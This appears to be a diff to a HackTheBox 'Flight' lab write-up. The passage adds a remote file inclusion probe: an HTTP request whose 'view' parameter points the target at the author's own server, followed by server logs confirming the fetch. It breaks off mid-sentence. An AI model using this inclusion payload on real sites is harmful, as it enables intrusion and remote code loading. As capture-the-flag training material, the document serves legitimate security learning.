@@ -233,5 +233,25 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 ```python
-
+GET /index.php?view=http://10.10.14.90:8000/test.txt HTTP/1.1
+Host: school.flight.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://school.flight.htb/index.php?view=home.html
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 ```
+Ill send this request and wait for a response on my server
+
+```python
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.228.120 - - [31/Mar/2026 16:44:56] code 404, message File not found
+10.129.228.120 - - [31/Mar/2026 16:44:56] "GET /test.txt HTTP/1.1" 404 -
+```
+Confirmed RFI
+
+To exploit this i can use r
